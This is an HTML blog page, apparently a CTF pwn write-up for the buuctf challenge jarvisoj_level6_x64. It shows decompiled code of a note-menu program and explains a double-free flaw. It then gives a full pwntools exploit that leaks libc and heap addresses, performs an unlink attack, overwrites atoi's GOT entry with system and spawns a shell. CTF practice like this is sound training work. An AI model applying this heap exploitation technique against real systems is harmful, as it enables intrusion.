@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="jarvisoj_level6_x64">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="John Doe">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="buuctf jarvisoj_level6_x64"/>
+    
+
+    <!--Open Graph Description-->
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="b4nd1t"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    
+        <meta name="twitter:card" content="summary" />
+    
+    
+    
+
+    <!-- Title -->
+    
+    <title>buuctf jarvisoj_level6_x64 - b4nd1t</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    <!-- Google Analytics -->
+    
+
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about.html">
+                    About
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    Categories
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact.html">
+                    Contact
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2023/03/23/level/">
+                buuctf jarvisoj_level6_x64
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2023-03-23</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/pwn/">pwn</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <h1 id="jarvisoj-level6-x64"><a href="#jarvisoj-level6-x64" class="headerlink" title="jarvisoj_level6_x64"></a>jarvisoj_level6_x64</h1><span id="more"></span>
+
+<h2 id="1-保护检查"><a href="#1-保护检查" class="headerlink" title="1.保护检查"></a>1.保护检查</h2><p><img src="/../img/1679543559944.png" alt="1679543559944"></p>
+<h2 id="2-源码分析"><a href="#2-源码分析" class="headerlink" title="2.源码分析"></a>2.源码分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  sub_4009FD(a1, a2, a3);</span><br><span class="line">  sub_400A49();</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    switch ( (unsigned int)menu() )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1u:</span><br><span class="line">        show();</span><br><span class="line">        break;</span><br><span class="line">      case 2u:</span><br><span class="line">        add();</span><br><span class="line">        break;</span><br><span class="line">      case 3u:</span><br><span class="line">        edit();</span><br><span class="line">        break;</span><br><span class="line">      case 4u:</span><br><span class="line">        delete();</span><br><span class="line">        break;</span><br><span class="line">      case 5u:</span><br><span class="line">        puts(&quot;Bye&quot;);</span><br><span class="line">        return 0LL;</span><br><span class="line">      default:</span><br><span class="line">        puts(&quot;Invalid!&quot;);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​	经典的菜单题，增删查改</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *sub_400A49()</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *result; // rax</span><br><span class="line">  int i; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  qword_6020A8 = (__int64)malloc(0x1810uLL);</span><br><span class="line">  *(_QWORD *)qword_6020A8 = 256LL;</span><br><span class="line">  result = (_QWORD *)qword_6020A8;</span><br><span class="line">  *(_QWORD *)(qword_6020A8 + 8) = 0LL;</span><br><span class="line">  for ( i = 0; i &lt;= 255; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)(qword_6020A8 + 24LL * i + 16) = 0LL;</span><br><span class="line">    *(_QWORD *)(qword_6020A8 + 24LL * i + 24) = 0LL;</span><br><span class="line">    result = (_QWORD *)(qword_6020A8 + 24LL * i + 32);</span><br><span class="line">    *result = 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在最开始申请了一个较大的块存放后来申请的块的信息</p>
+<p>add函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">int add()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; // rax</span><br><span class="line">  int i; // [rsp+Ch] [rbp-14h]</span><br><span class="line">  int v3; // [rsp+10h] [rbp-10h]</span><br><span class="line">  void *v4; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  if ( *(_QWORD *)(qword_6020A8 + 8) &lt; *(_QWORD *)qword_6020A8 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = *(_QWORD *)qword_6020A8;</span><br><span class="line">      if ( i &gt;= *(_QWORD *)qword_6020A8 )</span><br><span class="line">        break;</span><br><span class="line">      if ( !*(_QWORD *)(qword_6020A8 + 24LL * i + 16) )</span><br><span class="line">      &#123;</span><br><span class="line">        printf(&quot;Length of new note: &quot;);</span><br><span class="line">        v3 = sub_40094E();</span><br><span class="line">        if ( v3 &gt; 0 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( v3 &gt; 4096 )</span><br><span class="line">            v3 = 4096;</span><br><span class="line">          v4 = malloc((128 - v3 % 128) % 128 + v3);</span><br><span class="line">          printf(&quot;Enter your note: &quot;);</span><br><span class="line">          sub_40085D(v4, (unsigned int)v3);</span><br><span class="line">          *(_QWORD *)(qword_6020A8 + 24LL * i + 16) = 1LL;</span><br><span class="line">          *(_QWORD *)(qword_6020A8 + 24LL * i + 24) = v3;</span><br><span class="line">          *(_QWORD *)(qword_6020A8 + 24LL * i + 32) = v4;</span><br><span class="line">          ++*(_QWORD *)(qword_6020A8 + 8);</span><br><span class="line">          LODWORD(v0) = puts(&quot;Done.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          LODWORD(v0) = puts(&quot;Invalid length!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        return v0;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = puts(&quot;Unable to create new note.&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>edit函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">int edit()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; // rbx</span><br><span class="line">  int v2; // [rsp+4h] [rbp-1Ch]</span><br><span class="line">  int v3; // [rsp+8h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Note number: &quot;);</span><br><span class="line">  v3 = sub_40094E();</span><br><span class="line">  if ( v3 &lt; 0 || v3 &gt;= *(_QWORD *)qword_6020A8 || *(_QWORD *)(qword_6020A8 + 24LL * v3 + 16) != 1LL )</span><br><span class="line">    return puts(&quot;Invalid number!&quot;);</span><br><span class="line">  printf(&quot;Length of note: &quot;);</span><br><span class="line">  v2 = sub_40094E();</span><br><span class="line">  if ( v2 &lt;= 0 )</span><br><span class="line">    return puts(&quot;Invalid length!&quot;);</span><br><span class="line">  if ( v2 &gt; 4096 )</span><br><span class="line">    v2 = 4096;</span><br><span class="line">  if ( v2 != *(_QWORD *)(qword_6020A8 + 24LL * v3 + 24) )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = qword_6020A8;</span><br><span class="line">    *(_QWORD *)(v1 + 24LL * v3 + 32) = realloc(*(void **)(qword_6020A8 + 24LL * v3 + 32), (128 - v2 % 128) % 128 + v2);</span><br><span class="line">    *(_QWORD *)(qword_6020A8 + 24LL * v3 + 24) = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;Enter your note: &quot;);</span><br><span class="line">  sub_40085D(*(_QWORD *)(qword_6020A8 + 24LL * v3 + 32), v2);</span><br><span class="line">  return puts(&quot;Done.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>delete函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int delete()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  if ( *(__int64 *)(qword_6020A8 + 8) &lt;= 0 )</span><br><span class="line">    return puts(&quot;No notes yet.&quot;);</span><br><span class="line">  printf(&quot;Note number: &quot;);</span><br><span class="line">  v1 = sub_40094E();</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt;= *(_QWORD *)qword_6020A8 )</span><br><span class="line">    return puts(&quot;Invalid number!&quot;);</span><br><span class="line">  --*(_QWORD *)(qword_6020A8 + 8);</span><br><span class="line">  *(_QWORD *)(qword_6020A8 + 24LL * v1 + 16) = 0LL;</span><br><span class="line">  *(_QWORD *)(qword_6020A8 + 24LL * v1 + 24) = 0LL;</span><br><span class="line">  free(*(void **)(qword_6020A8 + 24LL * v1 + 32));</span><br><span class="line">  return puts(&quot;Done.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>show函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">int show()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; // rax</span><br><span class="line">  unsigned int i; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  if ( *(__int64 *)(qword_6020A8 + 8) &lt;= 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = puts(&quot;You need to create some new notes first.&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = *(_QWORD *)qword_6020A8;</span><br><span class="line">      if ( (int)i &gt;= *(_QWORD *)qword_6020A8 )</span><br><span class="line">        break;</span><br><span class="line">      if ( *(_QWORD *)(qword_6020A8 + 24LL * (int)i + 16) == 1LL )</span><br><span class="line">        printf(&quot;%d. %s\n&quot;, i, *(const char **)(qword_6020A8 + 24LL * (int)i + 32));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>漏洞点：在delete中free后没有进行置0，而且delete函数中没有对该块是否free进行检查，所以会造成double free等操作。</p>
+<p>思路：最初可以通过free再申请的然后再show的操作进行libc和heap地址的泄露，然后伪造堆块进行ulink操作，就会在ptr位置写入ptr-18，把atoi_got写入前面的大堆块中，进行edit操作把system函数的地址写入atoi_got，在之后输入&#x2F;bin&#x2F;sh即可拿到shell。</p>
+<h2 id="3-exp"><a href="#3-exp" class="headerlink" title="3.exp"></a>3.exp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">#p = process(&quot;./buu&quot;)</span><br><span class="line">p = remote(&#x27;node4.buuoj.cn&#x27;,25461)</span><br><span class="line">libc = ELF(&quot;u1664.so&quot;)</span><br><span class="line">atoi_got = 0x602070</span><br><span class="line">def add(size,content):</span><br><span class="line">	p.sendlineafter(&quot;Your choice: &quot;,&quot;2&quot;)</span><br><span class="line">	p.sendlineafter(&quot;Length of new note: &quot;,str(size))</span><br><span class="line">	p.sendafter(&quot;Enter your note: &quot;,content)</span><br><span class="line">def show():</span><br><span class="line">	p.sendlineafter(&quot;Your choice: &quot;,&quot;1&quot;)</span><br><span class="line">def edit(index,size,content):</span><br><span class="line">	p.sendlineafter(&quot;Your choice: &quot;,&quot;3&quot;)</span><br><span class="line">	p.sendlineafter(&quot;Note number: &quot;,str(index))</span><br><span class="line">	p.sendlineafter(&quot;Length of note: &quot;,str(size))</span><br><span class="line">	p.sendafter(&quot;Enter your note: &quot;,content)</span><br><span class="line">def delete(index):</span><br><span class="line">	p.sendlineafter(&quot;Your choice: &quot;,&quot;4&quot;)</span><br><span class="line">	p.sendlineafter(&quot;Note number: &quot;,str(index))</span><br><span class="line">def debug():</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">payload = &#x27;a&#x27;*0x80</span><br><span class="line">add(0x80,payload)</span><br><span class="line">add(0x80,payload)</span><br><span class="line">add(0x80,payload)</span><br><span class="line">add(0x80,payload)</span><br><span class="line">delete(1)</span><br><span class="line">add(8,&#x27;b&#x27;*8)</span><br><span class="line">show()</span><br><span class="line">libcbase = u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;)) - 88 - 0x10 - libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">print(hex(libcbase))</span><br><span class="line">system_addr = libcbase + libc.sym[&#x27;system&#x27;]</span><br><span class="line">delete(0)</span><br><span class="line">delete(2)</span><br><span class="line">add(8,&#x27;c&#x27;*8)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(&#x27;c&#x27;*8)</span><br><span class="line">heap_addr = u64(p.recvuntil(&quot;\x0a&quot;)[:-1].ljust(8,&quot;\x00&quot;)) - 0x1940</span><br><span class="line">print(hex(heap_addr))</span><br><span class="line">add(0x80,payload)</span><br><span class="line">delete(1)</span><br><span class="line">payload = p64(0) + p64(0x81) + p64(heap_addr + 0x30 - 0x18) + p64(heap_addr + 0x30 - 0x10) + &#x27;a&#x27;*0x60 + p64(0x80) + p64(0x90)</span><br><span class="line">edit(0,0x90,payload)</span><br><span class="line">delete(1)</span><br><span class="line">payload = p64(2) + p64(1) + p64(0x8) + p64(atoi_got) + &#x27;a&#x27;*0x70</span><br><span class="line">edit(0,0x90,payload)</span><br><span class="line">payload = p64(system_addr)</span><br><span class="line">edit(0,8,payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&quot;/bin/sh\x00&quot;)</span><br><span class="line">#debug()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/1679575192584.png" alt="1679575192584"></p>
+
+    </div>
+
+    
+
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2023/03/23/level/">buuctf jarvisoj_level6_x6</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2023/03/20/typo/">typo(arm)</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2023/03/20/qemu/">qemu</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2023/03/19/babypie/">babypie</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
+    <h2>Categories</h2>
+    <ul>
+        
+        <li>
+            <a class="footer-post" href="/categories/tools/">tools</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/pwn/">pwn</a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://github.com/7bandit">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://twitter.com/?lang=en">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://www.facebook.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://www.instagram.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://dribbble.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://telegram.org/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-telegram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://www.behance.net/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-behance"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a target="_blank" rel="noopener" href="https://500px.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-500px"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:test@example.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="\#">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-rss"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    @Untitled. All right reserved | Design & Hexo <a target="_blank" rel="noopener" href="http://www.codeblocq.com/">Jonathan Klughertz</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+
+<script src="/js/main.js"></script>
+
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
